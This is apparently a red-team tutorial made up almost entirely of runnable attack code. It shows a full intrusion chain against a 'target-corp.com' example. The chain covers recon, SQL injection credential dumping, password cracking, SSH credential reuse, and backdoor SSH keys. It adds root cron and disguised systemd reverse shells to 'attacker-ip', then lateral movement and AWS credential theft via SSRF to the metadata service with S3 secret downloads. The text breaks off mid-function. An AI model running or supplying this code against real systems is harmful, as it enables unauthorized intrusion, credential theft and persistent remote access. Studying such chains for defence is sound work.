# 🔥 Elite Real-World Attack Scenarios & Case Studies
## Professional Bug Bounty & Red Team Attack Methodologies

### 🎯 Table of Contents
1. [Corporate Network Penetration](#corporate-network)
2. [Cloud Infrastructure Compromise](#cloud-compromise)
3. [Web Application Attack Chains](#web-attack-chains)
4. [Mobile Application Security](#mobile-security)
5. [IoT & Hardware Exploitation](#iot-hardware)
6. [Social Engineering Campaigns](#social-engineering)
7. [Advanced Persistent Threat (APT) Simulation](#apt-simulation)
8. [Bug Bounty Success Stories](#bug-bounty-stories)

---

## 🏢 Corporate Network Penetration {#corporate-network}

### Case Study 1: Fortune 500 Company Full Domain Compromise

#### Initial Reconnaissance
```bash
#!/bin/bash
# Phase 1: External Reconnaissance

TARGET_DOMAIN="target-corp.com"
OUTPUT_DIR="recon_$(date +%Y%m%d)"
mkdir -p $OUTPUT_DIR

echo "🔍 Starting reconnaissance for $TARGET_DOMAIN"

# Subdomain enumeration
echo "📋 Enumerating subdomains..."
subfinder -d $TARGET_DOMAIN -silent -o $OUTPUT_DIR/subdomains_subfinder.txt
amass enum -passive -d $TARGET_DOMAIN -o $OUTPUT_DIR/subdomains_amass.txt
assetfinder --subs-only $TARGET_DOMAIN > $OUTPUT_DIR/subdomains_assetfinder.txt

# Certificate transparency
curl -s "https://crt.sh/?q=%25.$TARGET_DOMAIN&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > $OUTPUT_DIR/subdomains_crt.txt

# Combine and deduplicate
cat $OUTPUT_DIR/subdomains_*.txt | sort -u > $OUTPUT_DIR/all_subdomains.txt
echo "✅ Found $(wc -l < $OUTPUT_DIR/all_subdomains.txt) unique subdomains"

# Live host discovery
echo "🌐 Discovering live hosts..."
cat $OUTPUT_DIR/all_subdomains.txt | httpx -silent -ports 80,443,8080,8443,8000,9000 -status-code -title -tech-detect -o $OUTPUT_DIR/live_hosts.txt

# Port scanning on live hosts
echo "🔍 Port scanning live hosts..."
cat $OUTPUT_DIR/live_hosts.txt | awk '{print $1}' | sed 's|https\?://||' | sort -u > $OUTPUT_DIR/live_ips.txt

# Comprehensive port scan
nmap -iL $OUTPUT_DIR/live_ips.txt -p- --min-rate 1000 -oN $OUTPUT_DIR/full_port_scan.txt

# Service enumeration
nmap -iL $OUTPUT_DIR/live_ips.txt -sV -sC -p 21,22,23,25,53,80,110,143,443,993,995,1433,3306,3389,5432,5985,5986 -oN $OUTPUT_DIR/service_scan.txt

# Web technology identification
cat $OUTPUT_DIR/live_hosts.txt | awk '{print $1}' | whatweb --color=never --no-errors -a 3 > $OUTPUT_DIR/web_technologies.txt

echo "📊 Reconnaissance complete. Results saved in $OUTPUT_DIR/"
```

#### Vulnerability Discovery
```python
#!/usr/bin/env python3
# Phase 2: Vulnerability Discovery

import requests
import subprocess
import json
import os
from concurrent.futures import ThreadPoolExecutor
import threading

class VulnerabilityScanner:
    def __init__(self, target_file):
        self.targets = self.load_targets(target_file)
        self.vulnerabilities = []
        self.lock = threading.Lock()
        
    def load_targets(self, target_file):
        """Load targets from file"""
        with open(target_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    
    def scan_web_vulnerabilities(self, target):
        """Scan for web vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for common vulnerabilities
            response = requests.get(target, timeout=10, verify=False)
            
            # Check for sensitive information disclosure
            sensitive_patterns = [
                'password', 'api_key', 'secret', 'token', 'private_key',
                'database', 'config', 'admin', 'debug', 'test'
            ]
            
            for pattern in sensitive_patterns:
                if pattern in response.text.lower():
                    vulnerabilities.append({
                        'type': 'Information Disclosure',
                        'target': target,
                        'description': f'Sensitive information found: {pattern}',
                        'severity': 'Medium'
                    })
            
            # Check for directory traversal
            traversal_payloads = [
                '../../../etc/passwd',
                '..\..\..\windows\system32\drivers\etc\hosts',
                '....//....//....//etc/passwd'
            ]
            
            for payload in traversal_payloads:
                test_url = f"{target}?file={payload}"
                try:
                    resp = requests.get(test_url, timeout=5, verify=False)
                    if 'root:' in resp.text or 'localhost' in resp.text:
                        vulnerabilities.append({
                            'type': 'Directory Traversal',
                            'target': test_url,
                            'description': 'Directory traversal vulnerability found',
                            'severity': 'High'
                        })
                        break
                except:
                    continue
            
            # Check for SQL injection
            sqli_payloads = [
                "'", "' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--"
            ]
            
            for payload in sqli_payloads:
                test_url = f"{target}?id={payload}"
                try:
                    resp = requests.get(test_url, timeout=5, verify=False)
                    if any(error in resp.text.lower() for error in ['mysql', 'sql', 'oracle', 'postgresql']):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'target': test_url,
                            'description': 'Potential SQL injection vulnerability',
                            'severity': 'Critical'
                        })
                        break
                except:
                    continue
            
            # Check for XSS
            xss_payloads = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")'
            ]
            
            for payload in xss_payloads:
                test_url = f"{target}?q={payload}"
                try:
                    resp = requests.get(test_url, timeout=5, verify=False)
                    if payload in resp.text:
                        vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'target': test_url,
                            'description': 'Reflected XSS vulnerability found',
                            'severity': 'High'
                        })
                        break
                except:
                    continue
                    
        except Exception as e:
            print(f"Error scanning {target}: {e}")
        
        return vulnerabilities
    
    def scan_network_vulnerabilities(self, target):
        """Scan for network-level vulnerabilities"""
        vulnerabilities = []
        
        # Extract hostname/IP from URL
        hostname = target.replace('https://', '').replace('http://', '').split('/')[0]
        
        # Check for common vulnerable services
        vulnerable_services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            135: 'RPC',
            139: 'NetBIOS',
            445: 'SMB',
            1433: 'MSSQL',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL'
        }
        
        for port, service in vulnerable_services.items():
            try:
                # Simple port check
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((hostname, port))
                sock.close()
                
                if result == 0:
                    vulnerabilities.append({
                        'type': 'Open Service',
                        'target': f"{hostname}:{port}",
                        'description': f'{service} service is accessible',
                        'severity': 'Medium'
                    })
            except:
                continue
        
        return vulnerabilities
    
    def run_nuclei_scan(self, target):
        """Run Nuclei vulnerability scanner"""
        try:
            result = subprocess.run([
                'nuclei', '-u', target, '-t', '/root/nuclei-templates/',
                '-severity', 'critical,high,medium', '-json'
            ], capture_output=True, text=True, timeout=300)
            
            vulnerabilities = []
            for line in result.stdout.split('
'):
                if line.strip():
                    try:
                        vuln_data = json.loads(line)
                        vulnerabilities.append({
                            'type': vuln_data.get('info', {}).get('name', 'Unknown'),
                            'target': target,
                            'description': vuln_data.get('info', {}).get('description', ''),
                            'severity': vuln_data.get('info', {}).get('severity', 'Unknown')
                        })
                    except:
                        continue
            
            return vulnerabilities
        except:
            return []
    
    def comprehensive_scan(self):
        """Run comprehensive vulnerability scan"""
        print("🔥 Starting comprehensive vulnerability scan...")
        
        def scan_target(target):
            print(f"🎯 Scanning {target}")
            
            # Web vulnerabilities
            web_vulns = self.scan_web_vulnerabilities(target)
            
            # Network vulnerabilities
            network_vulns = self.scan_network_vulnerabilities(target)
            
            # Nuclei scan
            nuclei_vulns = self.run_nuclei_scan(target)
            
            # Combine results
            all_vulns = web_vulns + network_vulns + nuclei_vulns
            
            with self.lock:
                self.vulnerabilities.extend(all_vulns)
                print(f"✅ Found {len(all_vulns)} vulnerabilities on {target}")
        
        # Parallel scanning
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(scan_target, self.targets)
        
        return self.vulnerabilities
    
    def generate_report(self):
        """Generate vulnerability report"""
        if not self.vulnerabilities:
            print("❌ No vulnerabilities found")
            return
        
        # Categorize by severity
        critical = [v for v in self.vulnerabilities if v['severity'].lower() == 'critical']
        high = [v for v in self.vulnerabilities if v['severity'].lower() == 'high']
        medium = [v for v in self.vulnerabilities if v['severity'].lower() == 'medium']
        low = [v for v in self.vulnerabilities if v['severity'].lower() == 'low']
        
        report = f"""
# 🔥 Vulnerability Assessment Report
**Generated:** {subprocess.run(['date'], capture_output=True, text=True).stdout.strip()}

## 📊 Executive Summary
- **Total Vulnerabilities:** {len(self.vulnerabilities)}
- **Critical:** {len(critical)}
- **High:** {len(high)}
- **Medium:** {len(medium)}
- **Low:** {len(low)}

## 🚨 Critical Vulnerabilities
"""
        
        for vuln in critical:
            report += f"""
### {vuln['type']}
- **Target:** {vuln['target']}
- **Description:** {vuln['description']}
- **Severity:** {vuln['severity']}
"""
        
        report += "
## ⚠️ High Severity Vulnerabilities
"
        for vuln in high:
            report += f"""
### {vuln['type']}
- **Target:** {vuln['target']}
- **Description:** {vuln['description']}
"""
        
        # Save report
        with open('vulnerability_report.md', 'w') as f:
            f.write(report)
        
        print(f"📋 Vulnerability report saved to: vulnerability_report.md")
        print(f"🎯 Total vulnerabilities found: {len(self.vulnerabilities)}")

# Usage
def main():
    scanner = VulnerabilityScanner('recon_*/live_hosts.txt')
    vulnerabilities = scanner.comprehensive_scan()
    scanner.generate_report()

if __name__ == "__main__":
    main()
```

#### Exploitation Chain
```python
#!/usr/bin/env python3
# Phase 3: Exploitation Chain

import requests
import subprocess
import base64
import time
import random

class ExploitationChain:
    def __init__(self):
        self.session = requests.Session()
        self.compromised_hosts = []
        
    def exploit_web_vulnerability(self, target, vuln_type):
        """Exploit identified web vulnerability"""
        print(f"💥 Exploiting {vuln_type} on {target}")
        
        if vuln_type == "SQL Injection":
            return self.exploit_sql_injection(target)
        elif vuln_type == "Cross-Site Scripting (XSS)":
            return self.exploit_xss(target)
        elif vuln_type == "Directory Traversal":
            return self.exploit_directory_traversal(target)
        
        return False
    
    def exploit_sql_injection(self, target):
        """Exploit SQL injection vulnerability"""
        # Union-based SQL injection
        payloads = [
            "' UNION SELECT 1,user(),database(),version()--",
            "' UNION SELECT 1,table_name,column_name,NULL FROM information_schema.columns--",
            "' UNION SELECT 1,username,password,email FROM users--"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(f"{target}?id={payload}", timeout=10)
                if "root@" in response.text or "admin" in response.text:
                    print(f"✅ SQL injection successful: {payload}")
                    
                    # Extract database information
                    self.extract_database_info(target)
                    return True
            except:
                continue
        
        return False
    
    def extract_database_info(self, target):
        """Extract sensitive information from database"""
        print("🔍 Extracting database information...")
        
        # Extract users table
        user_payload = "' UNION SELECT 1,CONCAT(username,':',password),email,NULL FROM users--"
        try:
            response = self.session.get(f"{target}?id={user_payload}", timeout=10)
            
            # Look for credentials
            import re
            credentials = re.findall(r'([a-zA-Z0-9_]+):([a-fA-F0-9]{32,})', response.text)
            
            if credentials:
                print("🔑 Found credentials:")
                for username, password_hash in credentials:
                    print(f"  {username}:{password_hash}")
                    
                    # Try to crack password hash
                    cracked = self.crack_password_hash(password_hash)
                    if cracked:
                        print(f"  🔓 Cracked: {username}:{cracked}")
                        
                        # Try credential reuse
                        self.test_credential_reuse(username, cracked)
        except:
            pass
    
    def crack_password_hash(self, password_hash):
        """Attempt to crack password hash"""
        # Common passwords
        common_passwords = [
            'password', '123456', 'admin', 'password123', 'qwerty',
            'letmein', 'welcome', 'monkey', '1234567890', 'password1'
        ]
        
        import hashlib
        
        for password in common_passwords:
            # Try MD5
            if hashlib.md5(password.encode()).hexdigest() == password_hash.lower():
                return password
            
            # Try SHA1
            if hashlib.sha1(password.encode()).hexdigest() == password_hash.lower():
                return password
            
            # Try SHA256
            if hashlib.sha256(password.encode()).hexdigest() == password_hash.lower():
                return password
        
        return None
    
    def test_credential_reuse(self, username, password):
        """Test credential reuse across services"""
        print(f"🔄 Testing credential reuse for {username}:{password}")
        
        # Test SSH
        try:
            result = subprocess.run([
                'sshpass', '-p', password, 'ssh', '-o', 'ConnectTimeout=5',
                '-o', 'StrictHostKeyChecking=no', f'{username}@target-host',
                'whoami'
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"✅ SSH access successful: {username}@target-host")
                self.compromised_hosts.append({
                    'host': 'target-host',
                    'service': 'SSH',
                    'credentials': f'{username}:{password}'
                })
                
                # Establish persistence
                self.establish_ssh_persistence('target-host', username, password)
                
                return True
        except:
            pass
        
        # Test RDP
        try:
            result = subprocess.run([
                'xfreerdp', '/u:' + username, '/p:' + password,
                '/v:target-host', '/cert-ignore', '+auth-only'
            ], capture_output=True, text=True, timeout=10)
            
            if "Authentication only" in result.stdout:
                print(f"✅ RDP access successful: {username}@target-host")
                self.compromised_hosts.append({
                    'host': 'target-host',
                    'service': 'RDP',
                    'credentials': f'{username}:{password}'
                })
                return True
        except:
            pass
        
        return False
    
    def establish_ssh_persistence(self, host, username, password):
        """Establish SSH persistence"""
        print(f"🔒 Establishing persistence on {host}")
        
        # Generate SSH key pair
        subprocess.run(['ssh-keygen', '-t', 'rsa', '-f', '/tmp/backdoor_key', '-N', ''], 
                      capture_output=True)
        
        # Read public key
        with open('/tmp/backdoor_key.pub', 'r') as f:
            public_key = f.read().strip()
        
        # Add public key to authorized_keys
        try:
            subprocess.run([
                'sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no',
                f'{username}@{host}',
                f'echo "{public_key}" >> ~/.ssh/authorized_keys'
            ], timeout=10)
            
            print(f"✅ SSH key persistence established on {host}")
            
            # Test key-based access
            result = subprocess.run([
                'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                f'{username}@{host}', 'whoami'
            ], capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"✅ Key-based SSH access confirmed")
                
                # Privilege escalation
                self.privilege_escalation(host, username)
                
        except Exception as e:
            print(f"❌ Failed to establish persistence: {e}")
    
    def privilege_escalation(self, host, username):
        """Attempt privilege escalation"""
        print(f"⬆️ Attempting privilege escalation on {host}")
        
        # Check for sudo privileges
        try:
            result = subprocess.run([
                'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                f'{username}@{host}', 'sudo -l'
            ], capture_output=True, text=True, timeout=10)
            
            if "NOPASSWD" in result.stdout:
                print("✅ Sudo NOPASSWD found - attempting root access")
                
                # Get root shell
                root_result = subprocess.run([
                    'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                    f'{username}@{host}', 'sudo whoami'
                ], capture_output=True, text=True, timeout=10)
                
                if "root" in root_result.stdout:
                    print("🎉 ROOT ACCESS ACHIEVED!")
                    
                    # Establish root persistence
                    self.establish_root_persistence(host, username)
                    
                    # Network discovery
                    self.network_discovery(host, username)
                    
        except Exception as e:
            print(f"❌ Privilege escalation failed: {e}")
    
    def establish_root_persistence(self, host, username):
        """Establish root-level persistence"""
        print(f"👑 Establishing root persistence on {host}")
        
        # Create root cron job
        cron_payload = "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'"
        
        try:
            subprocess.run([
                'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                f'{username}@{host}',
                f'echo "{cron_payload}" | sudo crontab -'
            ], timeout=10)
            
            print("✅ Root cron job persistence established")
            
            # Create system service
            service_content = """[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker-ip/4445 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target"""
            
            subprocess.run([
                'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                f'{username}@{host}',
                f'echo "{service_content}" | sudo tee /etc/systemd/system/update.service'
            ], timeout=10)
            
            subprocess.run([
                'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                f'{username}@{host}',
                'sudo systemctl enable update.service'
            ], timeout=10)
            
            print("✅ System service persistence established")
            
        except Exception as e:
            print(f"❌ Failed to establish root persistence: {e}")
    
    def network_discovery(self, host, username):
        """Discover internal network from compromised host"""
        print(f"🕵️ Discovering internal network from {host}")
        
        try:
            # Get network interfaces
            result = subprocess.run([
                'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                f'{username}@{host}', 'ip addr show'
            ], capture_output=True, text=True, timeout=10)
            
            print("🌐 Network interfaces:")
            print(result.stdout)
            
            # ARP table
            arp_result = subprocess.run([
                'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                f'{username}@{host}', 'arp -a'
            ], capture_output=True, text=True, timeout=10)
            
            print("📋 ARP table:")
            print(arp_result.stdout)
            
            # Network scan from compromised host
            subprocess.run([
                'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                f'{username}@{host}',
                'nmap -sn 192.168.1.0/24 > /tmp/network_scan.txt'
            ], timeout=60)
            
            # Retrieve scan results
            scan_result = subprocess.run([
                'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                f'{username}@{host}', 'cat /tmp/network_scan.txt'
            ], capture_output=True, text=True, timeout=10)
            
            print("🎯 Internal network hosts:")
            print(scan_result.stdout)
            
            # Lateral movement
            self.lateral_movement(host, username, scan_result.stdout)
            
        except Exception as e:
            print(f"❌ Network discovery failed: {e}")
    
    def lateral_movement(self, pivot_host, username, network_scan):
        """Perform lateral movement to other hosts"""
        print(f"➡️ Attempting lateral movement from {pivot_host}")
        
        # Extract IP addresses from network scan
        import re
        ip_addresses = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', network_scan)
        
        for target_ip in ip_addresses[:5]:  # Test first 5 IPs
            if target_ip == pivot_host:
                continue
                
            print(f"🎯 Testing lateral movement to {target_ip}")
            
            # Test credential reuse
            try:
                result = subprocess.run([
                    'ssh', '-i', '/tmp/backdoor_key', '-o', 'StrictHostKeyChecking=no',
                    '-o', 'ConnectTimeout=5',
                    f'{username}@{target_ip}', 'whoami'
                ], capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0:
                    print(f"✅ Lateral movement successful to {target_ip}")
                    self.compromised_hosts.append({
                        'host': target_ip,
                        'service': 'SSH',
                        'method': 'Lateral Movement'
                    })
                    
                    # Establish persistence on new host
                    self.establish_ssh_persistence(target_ip, username, "")
                    
            except:
                continue
    
    def generate_compromise_report(self):
        """Generate compromise report"""
        report = f"""
# 🔥 Network Compromise Report
**Generated:** {time.strftime('%Y-%m-%d %H:%M:%S')}

## 📊 Compromise Summary
- **Total Compromised Hosts:** {len(self.compromised_hosts)}
- **Attack Vector:** Web Application SQL Injection
- **Privilege Level:** Root access achieved
- **Persistence:** Multiple methods established

## 🎯 Compromised Systems
"""
        
        for i, host in enumerate(self.compromised_hosts, 1):
            report += f"""
### Host {i}: {host['host']}
- **Service:** {host['service']}
- **Method:** {host.get('method', 'Direct exploitation')}
- **Credentials:** {host.get('credentials', 'Key-based access')}
"""
        
        report += """
## 🔒 Persistence Mechanisms
1. SSH key-based access
2. Root cron jobs
3. System services
4. Multiple backdoors

## 🛡️ Recommendations
1. Patch SQL injection vulnerability
2. Implement input validation
3. Use parameterized queries
4. Enable multi-factor authentication
5. Network segmentation
6. Regular security audits
"""
        
        with open('compromise_report.md', 'w') as f:
            f.write(report)
        
        print(f"📋 Compromise report saved to: compromise_report.md")
        print(f"🎉 Total systems compromised: {len(self.compromised_hosts)}")

# Usage
def main():
    exploit_chain = ExploitationChain()
    
    # Simulate exploitation chain
    target = "https://vulnerable-app.target-corp.com"
    
    if exploit_chain.exploit_web_vulnerability(target, "SQL Injection"):
        print("🎉 Initial compromise successful!")
        exploit_chain.generate_compromise_report()
    else:
        print("❌ Exploitation failed")

if __name__ == "__main__":
    main()
```

---

## ☁️ Cloud Infrastructure Compromise {#cloud-compromise}

### Case Study 2: AWS Environment Complete Takeover

#### Cloud Reconnaissance
```python
#!/usr/bin/env python3
# AWS Cloud Reconnaissance and Exploitation

import boto3
import requests
import json
import base64
from botocore.exceptions import ClientError, NoCredentialsError

class AWSCloudExploit:
    def __init__(self):
        self.session = None
        self.credentials = {}
        self.compromised_resources = []
        
    def discover_aws_metadata(self, target_url, param):
        """Discover AWS metadata through SSRF"""
        print("🔍 Attempting AWS metadata discovery...")
        
        metadata_endpoints = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document"
        ]
        
        for endpoint in metadata_endpoints:
            try:
                response = requests.post(
                    target_url,
                    data={param: endpoint},
                    timeout=10
                )
                
                if "instance-id" in response.text or "AccessKeyId" in response.text:
                    print(f"✅ AWS metadata accessible: {endpoint}")
                    
                    if "security-credentials" in endpoint and endpoint.endswith("/"):
                        # Get IAM role names
                        roles = response.text.strip().split('
')
                        for role in roles:
                            if role.strip():
                                self.extract_iam_credentials(target_url, param, role.strip())
                    
                    elif "AccessKeyId" in response.text:
                        # Parse credentials directly
                        self.parse_aws_credentials(response.text)
                        
                    return True
                    
            except Exception as e:
                continue
        
        return False
    
    def extract_iam_credentials(self, target_url, param, role_name):
        """Extract IAM credentials for specific role"""
        print(f"🔑 Extracting credentials for role: {role_name}")
        
        creds_endpoint = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        
        try:
            response = requests.post(
                target_url,
                data={param: creds_endpoint},
                timeout=10
            )
            
            if "AccessKeyId" in response.text:
                self.parse_aws_credentials(response.text)
                return True
                
        except Exception as e:
            print(f"❌ Failed to extract credentials: {e}")
        
        return False
    
    def parse_aws_credentials(self, response_text):
        """Parse AWS credentials from response"""
        try:
            # Try to parse as JSON
            creds_data = json.loads(response_text)
            
            self.credentials = {
                'AccessKeyId': creds_data.get('AccessKeyId'),
                'SecretAccessKey': creds_data.get('SecretAccessKey'),
                'Token': creds_data.get('Token'),
                'RoleName': creds_data.get('RoleName', 'Unknown')
            }
            
            print(f"✅ AWS credentials extracted:")
            print(f"  Access Key: {self.credentials['AccessKeyId']}")
            print(f"  Role: {self.credentials['RoleName']}")
            
            # Initialize AWS session
            self.initialize_aws_session()
            
        except json.JSONDecodeError:
            # Try to extract from text format
            import re
            
            access_key = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', response_text)
            secret_key = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', response_text)
            token = re.search(r'"Token"\s*:\s*"([^"]+)"', response_text)
            
            if access_key and secret_key:
                self.credentials = {
                    'AccessKeyId': access_key.group(1),
                    'SecretAccessKey': secret_key.group(1),
                    'Token': token.group(1) if token else None
                }
                
                print(f"✅ AWS credentials extracted from text format")
                self.initialize_aws_session()
    
    def initialize_aws_session(self):
        """Initialize AWS session with extracted credentials"""
        try:
            self.session = boto3.Session(
                aws_access_key_id=self.credentials['AccessKeyId'],
                aws_secret_access_key=self.credentials['SecretAccessKey'],
                aws_session_token=self.credentials.get('Token')
            )
            
            # Test credentials
            sts = self.session.client('sts')
            identity = sts.get_caller_identity()
            
            print(f"✅ AWS session initialized successfully")
            print(f"  Account: {identity.get('Account')}")
            print(f"  User/Role: {identity.get('Arn')}")
            
            return True
            
        except Exception as e:
            print(f"❌ Failed to initialize AWS session: {e}")
            return False
    
    def enumerate_aws_resources(self):
        """Enumerate AWS resources"""
        if not self.session:
            print("❌ No AWS session available")
            return
        
        print("🔍 Enumerating AWS resources...")
        
        # Enumerate S3 buckets
        self.enumerate_s3_buckets()
        
        # Enumerate EC2 instances
        self.enumerate_ec2_instances()
        
        # Enumerate IAM resources
        self.enumerate_iam_resources()
        
        # Enumerate Lambda functions
        self.enumerate_lambda_functions()
        
        # Enumerate RDS instances
        self.enumerate_rds_instances()
    
    def enumerate_s3_buckets(self):
        """Enumerate S3 buckets"""
        print("📦 Enumerating S3 buckets...")
        
        try:
            s3 = self.session.client('s3')
            response = s3.list_buckets()
            
            for bucket in response['Buckets']:
                bucket_name = bucket['Name']
                print(f"  📦 Bucket: {bucket_name}")
                
                # Check bucket permissions
                self.check_s3_bucket_permissions(bucket_name)
                
                # List objects
                self.list_s3_bucket_objects(bucket_name)
                
        except ClientError as e:
            print(f"❌ S3 enumeration failed: {e}")
    
    def check_s3_bucket_permissions(self, bucket_name):
        """Check S3 bucket permissions"""
        try:
            s3 = self.session.client('s3')
            
            # Check if bucket is publicly readable
            try:
                s3.head_bucket(Bucket=bucket_name)
                print(f"    ✅ Read access to {bucket_name}")
                
                # Try to list objects
                response = s3.list_objects_v2(Bucket=bucket_name, MaxKeys=5)
                if 'Contents' in response:
                    print(f"    📋 {len(response['Contents'])} objects found")
                    
            except ClientError:
                print(f"    ❌ No read access to {bucket_name}")
            
            # Check if bucket is publicly writable
            try:
                test_key = "test-write-access.txt"
                s3.put_object(Bucket=bucket_name, Key=test_key, Body=b"test")
                print(f"    ⚠️ WRITE ACCESS to {bucket_name}")
                
                # Clean up test object
                s3.delete_object(Bucket=bucket_name, Key=test_key)
                
                self.compromised_resources.append({
                    'type': 'S3 Bucket',
                    'name': bucket_name,
                    'access': 'Read/Write',
                    'risk': 'High'
                })
                
            except ClientError:
                pass
                
        except Exception as e:
            print(f"    ❌ Permission check failed: {e}")
    
    def list_s3_bucket_objects(self, bucket_name):
        """List interesting objects in S3 bucket"""
        try:
            s3 = self.session.client('s3')
            response = s3.list_objects_v2(Bucket=bucket_name, MaxKeys=100)
            
            if 'Contents' not in response:
                return
            
            interesting_files = []
            for obj in response['Contents']:
                key = obj['Key']
                
                # Look for interesting file types
                if any(ext in key.lower() for ext in [
                    '.key', '.pem', '.p12', '.pfx', '.crt', '.cer',
                    '.config', '.conf', '.env', '.ini',
                    '.sql', '.db', '.sqlite',
                    '.backup', '.bak', '.dump',
                    'password', 'secret', 'credential'
                ]):
                    interesting_files.append(key)
            
            if interesting_files:
                print(f"    🎯 Interesting files in {bucket_name}:")
                for file in interesting_files[:10]:  # Show first 10
                    print(f"      - {file}")
                    
                    # Try to download sensitive files
                    self.download_sensitive_s3_object(bucket_name, file)
                    
        except Exception as e:
            print(f"    ❌ Object listing failed: {e}")
    
    def download_sensitive_s3_object(self, bucket_name, object_key):
        """Download sensitive S3 objects"""
        try:
            s3 = self.session.client('s3')
            
            # Download object
            response = s3.get_object(Bucket=bucket_name, Key=object_key)
            content = response['Body'].read()
            
            # Save to file
            safe_filename = object_key.replace('/', '_').replace('', '_')
            with open(f"s3_{bucket_name}_{safe_filename}", 'wb') as f:
                f.write(content)
            
            print(f"    💾 Downloaded: {object_key}")
            
            # Analyze content for credentials
            if content:
                self.analyze_file_for_credentials(content.decode('utf-8', errors='ignore'))
                
        except Exception as e:
            print(f"    ❌ Download failed for {object_key}: {e}")
    
    def analyze_file_for_credentials(self, content):
        """Analyze file content for credentials"""
        import re
        
        # AWS Access Keys
        aws_keys = re.findall(r'AKIA[0-9A-Z]{16}', content)
        if aws_keys:
            print(f"    🔑 Found AWS Access Keys: {aws_keys}")
        
        # Private keys
        if '-----BEGIN' in content and 'PRIVATE KEY' in content:
            print(f"    🔐 Found private key in file")
        
        # Database credentials
        db_patterns = [
            r'password\s*=\s*["']([^"']+)["']',
            r'PASSWORD\s*=\s*["']([^"']+)["']',
            r'mysql://[^:]+:([^@]+)@',
            r'postgresql://[^:]+:([^@]+)@'
        ]
        
        for pattern in db_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"    🗄️ Found database credentials: {matches}")
    
    def enumerate_ec2_instances(self):
        """Enumerate EC2 instances"""
        print("🖥️ Enumerating EC2 instances...")
        
        try:
            ec2 = self.session.client('ec2')
            response = ec2.describe_instances()
            
            for reservation in response['Reservations']:
                for instance in reservation['Instances']:
                    instance_id = instance['InstanceId']
                    state = instance['State']['Name']
                    instance_type = instance['InstanceType']
                    
                    print(f"  🖥️ Instance: {instance_id} ({instance_type}) - {state}")
                    
                    if state == 'running':
                        # Check for public IP
                        public_ip = instance.get('PublicIpAddress')
                        if public_ip:
                            print(f"    🌐 Public IP: {public_ip}")
                            
                        # Check security groups
                        self.analyze_security_groups(instance['SecurityGroups'])
                        
                        # Check for user data
                        self.check_ec2_user_data(instance_id)
                        
        except ClientError as e:
            print(f"❌ EC2 enumeration failed: {e}")
    
    def analyze_security_groups(self, security_groups):
        """Analyze EC2 security groups"""
        try:
            ec2 = self.session.client('ec2')
            
            for sg in security_groups:
                sg_id = sg['GroupId']
                
                response = ec2.describe_security_groups(GroupIds=[sg_id])
                sg_details = response['SecurityGroups'][0]
                
                print(f"    🛡️ Security Group: {sg_id}")
                
                # Check for overly permissive rules
                for rule in sg_details['IpPermissions']:
                    for ip_range in rule.get('IpRanges', []):
                        if ip_range.get('CidrIp') == '0.0.0.0/0':
                            port_range = f"{rule.get('FromPort', 'All')}-{rule.get('ToPort', 'All')}"
                            print(f"      ⚠️ Open to internet: {rule['IpProtocol']} {port_range}")
                            
                            self.compromised_resources.append({
                                'type': 'Security Group',
                                'name': sg_id,
                                'issue': f"Open {rule['IpProtocol']} {port_range} to 0.0.0.0/0",
                                'risk': 'High'
                            })
                            
        except Exception as e:
            print(f"    ❌ Security group analysis failed: {e}")
    
    def check_ec2_user_data(self, instance_id):
        """Check EC2 user data for sensitive information"""
        try:
            ec2 = self.session.client('ec2')
            
            response = ec2.describe_instance_attribute(
                InstanceId=instance_id,
                Attribute='userData'
            )
            
            if 'UserData' in response and 'Value' in response['UserData']:
                user_data = base64.b64decode(response['UserData']['Value']).decode('utf-8')
                print(f"    📜 User data found for {instance_id}")
                
                # Analyze user data for credentials
                self.analyze_file_for_credentials(user_data)
                
        except Exception as e:
            print(f"    ❌ User data check failed: {e}")
    
    def enumerate_iam_resources(self):
        """Enumerate IAM resources"""
        print("👤 Enumerating IAM resources...")
        
        try:
            iam = self.session.client('iam')
            
            # List users
